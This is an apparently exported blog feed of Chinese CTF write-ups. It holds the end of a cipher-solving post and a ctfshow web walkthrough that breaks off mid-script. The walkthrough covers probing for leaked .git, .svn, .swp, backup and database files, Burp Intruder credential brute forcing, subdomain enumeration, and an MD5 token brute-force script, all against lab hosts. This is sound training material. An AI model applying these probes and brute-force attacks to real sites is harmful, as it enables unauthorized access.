class="keyword">if</span> any(i <span class="keyword">in</span> list <span class="keyword">for</span> i <span class="keyword">in</span> delete_list) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    err = <span class="string">&#x27;ZSBGI&#x27;</span></span><br><span class="line">    s2 = <span class="string">&#x27;QW1hbIGZZXJSXZNVBZW=&#x27;</span></span><br><span class="line">    ap = getallerrorPossible(s2, err)</span><br><span class="line">    delete = [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;œ&#x27;</span>]<span class="comment">#剔除包含这些字符的情况</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> ap:</span><br><span class="line">        r = letterCasePermutation(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = base64.b64decode(i).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> f.isprintable() <span class="keyword">and</span> <span class="keyword">not</span> delete_fun(f, delete):</span><br><span class="line">                    res.append(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        print(i)</span><br><span class="line">    print(<span class="string">&quot;[*]一共解出&#123;0&#125;个&quot;</span>.format(len(res)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>运行后<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6/6YEQDS6CN0TBVR%28VC~666HM.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Aman_very_cool&#125;</span><br></pre></td></tr></table></figure>
<h3 id="黄道十二宫"><a class="header-anchor" href="#黄道十二宫">¶</a>黄道十二宫</h3>
<p>题目来源于最近被破解的十二宫杀手密码，也是最近i春秋出的原题，只是里面一些字符被改动了<br>
有兴趣的可以去了解这个故事：<a href="https://www.sohu.com/a/437973880_610300">https://www.sohu.com/a/437973880_610300</a><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/QBL%24HSS%24Q6VGB_%5BU31AVT7L.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/R5FG%249_4LUP%7D%5D~06VTT%29%24%7BH.png" alt=""><br>
首先我们先把图片的内容抄下来<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%98.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%,,@*&gt;@?&#x3D;&#x3D;%88%5</span><br><span class="line">,@%#@@90-7$^&#x3D;*@</span><br><span class="line">17,(&gt;()1@##-$40</span><br><span class="line">~,*6?#%#8#&#x3D;75+1</span><br><span class="line">(*@*1%#&gt;,0@5)%?</span><br><span class="line">%*^&#x3D;)&amp;&gt;&#x3D;1%,+7&amp;#</span><br><span class="line">8681(+8*@@(,@@@</span><br><span class="line">#*&#x3D;#$3*#%,#%%,3</span><br><span class="line">,*+7,7+@&#x3D;&#x3D;&#x3D;+)61</span><br></pre></td></tr></table></figure>
<p>然后用脚本进行排列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1=<span class="string">r&#x27;%,,@*&gt;@?==%88%5&#x27;</span>*<span class="number">9</span></span><br><span class="line">s2=<span class="string">r&#x27;,@%#@@90-7$^=*@&#x27;</span>*<span class="number">9</span></span><br><span class="line">s3=<span class="string">r&#x27;17,(&gt;()1@##-$40&#x27;</span>*<span class="number">9</span></span><br><span class="line">s4=<span class="string">r&#x27;~,*6?#%#8#=75+1&#x27;</span>*<span class="number">9</span></span><br><span class="line">s5=<span class="string">r&#x27;(*@*1%#&gt;,0@5)%?&#x27;</span>*<span class="number">9</span></span><br><span class="line">s6=<span class="string">r&#x27;%*^=)&amp;&gt;=1%,+7&amp;#&#x27;</span>*<span class="number">9</span></span><br><span class="line">s7=<span class="string">r&#x27;8681(+8*@@(,@@@&#x27;</span>*<span class="number">9</span></span><br><span class="line">s8=<span class="string">r&#x27;#*=#$3*#%,#%%,3&#x27;</span>*<span class="number">9</span></span><br><span class="line">s9=<span class="string">r&#x27;,*+7,7+@===+)61&#x27;</span>*<span class="number">9</span></span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">    tmp += s1[i]+s2[i+<span class="number">2</span>]+s3[i+<span class="number">4</span>]+s4[i+<span class="number">6</span>]+s5[i+<span class="number">8</span>]+s6[i+<span class="number">10</span>]+s7[i+<span class="number">12</span>]+s8[i+<span class="number">14</span>]+s9[i+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span>(<span class="params">obj, sec</span>):</span></span><br><span class="line">    str_list = [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(obj),sec)]</span><br><span class="line">    print(str_list)</span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line">l1=cut(tmp,<span class="number">17</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">    <span class="keyword">print</span> (i)</span><br></pre></td></tr></table></figure>
<p>运行后得到排列结果<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/%25YO58T43%4034M%5D_24E72I%7BCF.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%%&gt;%,,@3*,#(#0+@#</span><br><span class="line">+,@)8@7@*7@@1#5&amp;8</span><br><span class="line">&#x3D;,*9@&#x3D;)#6#7&gt;0#7%%</span><br><span class="line">8$+@-#5?*13@?7-+(</span><br><span class="line">^(*&#x3D;&#x3D;$$1*&#x3D;+#&#x3D;&#x3D;^4~</span><br><span class="line">@)8%&#x3D;%&#x3D;0,*&amp;*,+8*1</span><br><span class="line">*1&gt;@#)8@76%&#x3D;@%6%,</span><br><span class="line">,?#1(%15@(#&gt;%,,,%</span><br><span class="line">%&gt;%,,@3*,#(#0+@#+</span><br></pre></td></tr></table></figure>
<p>再放入AZdecrypt软件中运行<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/PL%29X0HOGMD%5D%5BAS94%7B_RLLWQ.png" alt=""><br>
看到了flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;alphananke&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reverse"><a class="header-anchor" href="#Reverse">¶</a>Reverse</h2>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-Web1000题系列修炼(一)</title>
    <url>/posts/14827/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>这个web系列题是前些日子我随意逛逛的时候，在ctfshow平台上发现的，正好web太菜了，借由这个系列题开始自我修炼吧😖</p>
<h2 id="信息收集-1-20"><a class="header-anchor" href="#信息收集-1-20">¶</a>信息收集(1-20)</h2>
<h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3>
<p>右键查看源码就能看到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web1/%24A%60L%5D%280Z%28L%24%5DUO3%60QC03%5B0K.png" alt=""></p>
<h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3>
<p>打开网页提示无法查看源代码，右键也使用不了，那我们就在url前面加上<code>view-source:</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;83a83588-671e-4a94-9c6f-6857f9e20c2f.chall.ctf.show&#x2F;</span><br></pre></td></tr></table></figure>
<p>访问后即可获得flag</p>
<h3 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h3>
<p>右键源码也没看到信息，去查看一下请求头和响应头，在响应头这里找到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web3/58CPJ8K6U1MK55EAIOYX6%24D.png" alt=""></p>
<h3 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h3>
<p>题目提示robots，所以我们直接访问<code>http://c6f215bf-6c3e-4a21-949b-1c37d603ca56.chall.ctf.show/robots.txt</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web4/%28SHD3YCKR5EX_PFSJJJ~%28KT.png" alt=""><br>
然后根据提示，再访问flagishere.txt，即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web4/8S25%29G2%40%25%7BLSCUTWJL%24FJJ1.png" alt=""></p>
<h3 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h3>
<p>题目提示是phps源码泄露，于是在index.php后面加上s，即构造url如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;69ba9522-1aaf-4726-b2df-360c5c88d1ac.chall.ctf.show&#x2F;index.phps</span><br></pre></td></tr></table></figure>
<p>访问后弹出一个下载文件，下载后打开文件得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web5/XL%7D%60G7X%5BG1ZPH%60HYCE__%40%7DR.png" alt=""></p>
<h3 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h3>
<p>题目提示www.zip源码泄露，于是构造url访问下载压缩包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;www.zip</span><br></pre></td></tr></table></figure>
<p>在压缩包中有一个fl000g.txt文件，打开内容为：flag{flag_here}，本来以为这是flag，然后提交错误了。接着访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
<p>得到正确的flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web6/%29%29EZQI_I6W%60%25OY7_%28GGJI%5B9.png" alt=""></p>
<h3 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h3>
<p>根据提示，是个git泄露问题，访问.git/index.php即可，即构造url如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e85f4c26-faf9-4ace-a049-4f1b4587ad44.chall.ctf.show&#x2F;.git&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>访问后就能得到flag</p>
<h3 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h3>
<p>根据提示，本题考查的是svn泄露</p>
<blockquote>
<p>SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p>
</blockquote>
<p>我们构造url访问，即可获得flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a79a4695-f024-44dd-af3e-4eb6c2720be7.chall.ctf.show&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h3>
<p>本题考查的是vim的缓存泄露</p>
<blockquote>
<p>vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。而本题的情景就是电脑死机了意外退出，导致存在临时文件</p>
</blockquote>
<p>构造url如下，下载.swp后缀结尾的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0b4ba9f5-92a1-42fa-ba28-49cff3f8400e.chall.ctf.show&#x2F;index.php.swp</span><br></pre></td></tr></table></figure>
<p>打开文件即可获取flag</p>
<h3 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h3>
<p>题目提示cookie，然后我们查看一下请求头，发现cookie数据为flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web10/5%5BL%7B~%7BV%24%245%254B7%5D67~%29B5CX.png" alt=""><br>
我们解一下url编码，得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web10/%5DCN%2579K%24A9%280%24%60%240_TOFG%28E.png" alt=""></p>
<h3 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h3>
<p>根据提示，查询对ctfshow域名进行dns查询，查看TXT记录<br>
阿里云查询链接：<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web11/RDP905P_SOZF0HM725N3%7DJV.png" alt=""><br>
获取flag成功</p>
<h3 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h3>
<p>根据题目提示，我们访问robots.txt，获取到后台地址<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/%24%24%28H%2954_BF%5DPS%7B06RN_M%7B7O.png" alt=""><br>
然后我们访问一下后台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c25a456d-63f7-497e-9170-0365a9cdce53.chall.ctf.show&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/3UKIBC9YJVM%40%7D6V%29O%28LT%291G.png" alt=""><br>
账号名直接盲猜admin，密码是网站底部的这串数字，372619038<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/ZIA0BV2O2KFNIR~5%24%282T2DN.png" alt=""><br>
登录进来后，获取到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/OD2%603%24A%4083R%5BL%287A%5DGC%24Z%5B2.png" alt=""></p>
<h3 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h3>
<p>在网站找到一个超链接<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web13/JDUYP_%7D%24%24HV%5B%7BUGOENSK%7BLB.png" alt=""><br>
访问后，发现开发者在文档中写了自己的后台地址和账号密码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web13/Q%25%25%40CO8%29ZM%40M1%29_%7BMLDU6P6.png" alt=""><br>
这里把your-domain换成自己的做题环境，访问后台地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e63907cd-33af-4c57-b605-4f7e04928e43.chall.ctf.show&#x2F;system1103&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p>输入账号和密码后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web13/1G7F~2%7D~NO048WQL%5D1LFUTR.png" alt=""></p>
<h3 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h3>
<p>打开网站，根据提示访问<code>http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/editor/</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/Y%5B8CN%60PAKNL%7BV%25SICU%60LH56.png" alt=""><br>
看到一个编辑器，在flash的上传中，发现有个文件空间<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/617KH%5BRRFKY%5D4L%5BI%5DW~UXA3.png" alt=""><br>
点击文件空间，发现爆出了目录<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%25U17ETN4D42GP3~TG%7D%25N3M8.png" alt=""><br>
找了找，flag在var/www/html/nothinghere/fl000g.txt中，于是构造url访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
<p>得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%60_%28G6DSOG5TBQLZLDH08F7V.png" alt=""></p>
<h3 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h3>
<p>根据题目提示邮箱，在网页底部发现一个邮箱<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/HK_MLVPS3%246282SAV6YPFIM.png" alt=""><br>
再url后面加上admin访问一下后台<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/VFRR%5DS8%60%60%7DV7%5D%251%25_2QAGS7.png" alt=""><br>
有一个忘记密码选项，点击一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/%24OSUPYKMZZOORSX80VE63S2.png" alt=""><br>
有密保问题，联想到qq邮箱，搜索一下qq<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/8%24BYJYK%5B7%251M3N0TF%60F%60VK2.png" alt=""><br>
得到地址为西安，于是提交西安<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/I%5D%5B9%7BXDD98TS%5BMO%5DB%28_%7B%29%60P.png" alt=""><br>
得到密码为admin7789，账号还是admin，登录后获得flag</p>
<h3 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h3>
<p>根据题目提示，存在探针</p>
<blockquote>
<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>
比如查看服务器支持什么，不支持什么，空间速度等等状况！</p>
</blockquote>
<p>于是访问<code>http://e42c0d7a-d052-485d-bb09-a7c68a6d0214.chall.ctf.show/tz.php</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web16/CL_7ZWZ3%24~0%7D3D0Q1PPD86H.png" alt=""><br>
再点击phpinfo查看信息<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web16/_NM4E%5B4%60TFQ%7DPP%60%240P2A~72.png" alt=""><br>
在页面搜索一下ctfshow，即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web16/MK%7B%28X5DI52%29LVAPG%7D%7BTJSQE.png" alt=""></p>
<h3 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h3>
<p>根据题目，查找ctfer.com的真实ip，于是用fofa查找<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web17/%7BE3HVN%5DBT7C7%7BR%29_G%7DL%29ODI.png" alt=""><br>
查到ip地址为：111.231.70.44，所以flag为：flag{111.231.70.44}</p>
<h3 id="web18"><a class="header-anchor" href="#web18">¶</a>web18</h3>
<p>打开是一个游戏，我们去找找它的文件，在js中发现了当分数大于100时，赋值的一串编码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web18/_%60NIPJPH%606XG7%7BHCOPOJMWC.png" alt=""><br>
我们拿去unicode解码一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web18/WHIID%5B%5BUR1Y%5DOL_G0K7H%247G.png" alt=""><br>
根据提示，访问110.php，构造url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;884e39f8-376a-4d61-9618-ee22fecc3327.chall.ctf.show&#x2F;110.php</span><br></pre></td></tr></table></figure>
<p>访问后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web18/%60OO6K~50K%60A%7B~0EC%24G%5D_52N.png" alt=""></p>
<h3 id="web19"><a class="header-anchor" href="#web19">¶</a>web19</h3>
<p>打开是一个登录框，右键查看一下源码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web19/_KY%7DOY%5BDG6ICR%5DH9U~N%600%28E.png" alt=""><br>
根据php源码，我们需要post发送用户名和密码过去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当用户名为admin</span><br><span class="line">密码为a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br><span class="line">即可输出flag</span><br></pre></td></tr></table></figure>
<p>构造发送post请求<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web19/%5DK48MGWOC%243%2555U6R%28YHEWA.png" alt=""><br>
成功获取flag</p>
<h3 id="web20"><a class="header-anchor" href="#web20">¶</a>web20</h3>
<p>根据题目提示，是mdb文件泄露</p>
<blockquote>
<p>mdb文件是早期asp+access构架的数据库文件</p>
</blockquote>
<p>于是我们访问/db/db.mdb，即构造url如下访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5c070a5e-3a51-4904-a668-4385dfa7e714.chall.ctf.show&#x2F;db&#x2F;db.mdb</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web20/A%60M~%5B%5B9GGXE8%7DAG4%7D%29V2~6H.png" alt=""><br>
下载db.mdb文件后，用记事本打开搜索flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web20/G8QY%29JHUVWV%60KE%40MU9K%7BXOT.png" alt=""><br>
成功获取到flag</p>
<h2 id="爆破-21-28"><a class="header-anchor" href="#爆破-21-28">¶</a>爆破(21-28)</h2>
<h3 id="web21"><a class="header-anchor" href="#web21">¶</a>web21</h3>
<p>题目给了一个zip文件，打开后解压是爆破的字典，我们抓包一下网址看看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/%7DJ%7BI5%243FC%5D0~HWVBF9YEZAA.png" alt=""><br>
发现账号和密码都被base64了，我们发送到intruder模块，给爆破的位置加上$符圈住<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CNNU1O4C%40XHK3Y5JORN%60Q1V.png" alt=""><br>
去base64解码一下看看格式<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/XNGZCN%286QM%40%40S%40%29%5DCDH5810.png" alt=""><br>
格式是账号:密码，那我们使用custom iterator(自定义迭代器)模块，首先第一个放账号admin<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CVUBPQE_TDC%60%282%7BNFWNJN66.png" alt=""><br>
第二个放符号<code>:</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/EE%24R8%28LNP_D4TP6_LGD%40WBX.png" alt=""><br>
第三个放题目给的字典<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/YDJT6U%5B3%7B%7B%5BW3%24LTQU%40S2I7.png" alt=""><br>
接着再进行base64编码，还有把后面这个url编码字符最好取消掉<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/BG65%608Y%28U%5D%5BZ_Z0Q9PIR%7B%40V.png" alt=""><br>
然后就是attack开始爆破了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/I%40HP%40S%299HT%5DREAIMIUYYV8K.png" alt=""><br>
爆破出密码，成功获得flag</p>
<h3 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h3>
<p>题目让我们去爆破ctfer.com域名，也就是去爆破子域名，直接上layer<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/CNI3BQ%29BITHJIJ~2%7B6E%5DFC6.png" alt=""><br>
爆破出有flag的子域名，访问后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/WW7DID%7BTYG1US%60G6%244MWXJI.png" alt=""></p>
<h3 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h3>
<p>打开看到php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>代码审计一下，输出flag需要满足两个条件</p>
<blockquote>
<p>注意，编程中是从0为下标开始，第一位是第二个数字<br>
第一，传入的token值经过md5加密后，第1位=第14位并且第14位=第17位<br>
第二，第1位+第14位+第17位÷第1位等于第31位</p>
</blockquote>
<p>根据源码改一下，写个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   10:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$dict = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt; <span class="number">36</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;<span class="number">36</span>;$j++)&#123;</span><br><span class="line">        $token = md5($dict[$i].$dict[$j]);</span><br><span class="line">        <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span 